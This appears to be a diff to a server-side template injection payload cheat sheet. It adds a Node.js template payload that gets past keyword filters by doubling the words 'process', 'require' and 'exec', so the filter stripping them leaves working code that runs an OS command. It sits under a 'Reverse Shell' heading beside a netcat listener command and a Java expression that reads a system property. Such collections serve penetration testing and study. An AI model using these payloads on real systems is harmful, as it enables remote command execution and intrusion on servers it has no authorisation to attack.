@@ -94,6 +94,11 @@ ${T(java.lang.System).getProperty('user.dir')}
 
 **Reverse Shell**
 - If keywords such as process, require and exec are getting filtered:
+
+```
+<%=global.proprocesscess.mainModule.requrequireire("child_proprocesscess").exexececSync("id").toString()%>
+```
+
 ```
 nc -nlvp 443
 
